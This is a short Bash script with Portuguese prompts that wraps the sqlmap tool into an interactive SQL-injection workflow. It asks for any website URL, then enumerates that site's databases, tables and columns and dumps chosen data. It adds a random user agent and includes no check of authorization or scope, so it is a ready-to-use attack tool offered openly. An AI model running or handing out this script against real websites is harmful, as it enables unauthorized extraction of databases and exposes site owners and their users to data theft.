#!/bin/bash

#chmod +x OtSql.sh
#./OtSql.sh



#---------------------------------
#  Created by Thiago{S3N4}
#---------------------------------
# My GitHub = https://github.com/ticosena
#---------------------------------
# Facebook = https://www.facebook.com/thiago.sena.3956
#---------------------------------

sh_Principal () {

cat <<!

	 Created by Thiago{S3N4}

   ██████╗ ████████╗███████╗ ██████╗ ██
  ██╔═══██╗╚══██╔══╝██╔════╝██╔═══██╗██║
  ██║   ██║   ██║   ███████╗██║   ██║██║
  ██║   ██║   ██║   ╚════██║██║▄▄ ██║██║
  ╚██████╔╝   ██║   ███████║╚██████╔╝███████╗
   ╚═════╝    ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝
!

	#Começando o Sqlmap no site

	echo -n "Site (ex:www.site.com/index.php?id=1): "
	read sit
	sudo sqlmap -u "$sit" --dbs --random-agent

sh_data
}

	#--dbs

sh_data () {
	echo -n "Escolha o DataBase: "
	read dat
	sudo sqlmap -u "$sit" -D "$dat" --tables

sh_tab
}

	#--tables

sh_tab () {
	echo -n  "Selecione a Tabela desejada :"
	read ta
	sudo sqlmap -u "$sit" -D "$dat" -T "$ta" --columns

sh_col
}

	#--columns

sh_col () {
	echo -n "Selecione a Coluna que deseja ver: "
	read co
	sudo sqlmap -u "$sit" -D "$dat" -T "$ta" -C "$co" --dump

sh_Principal

}

sh_Principal
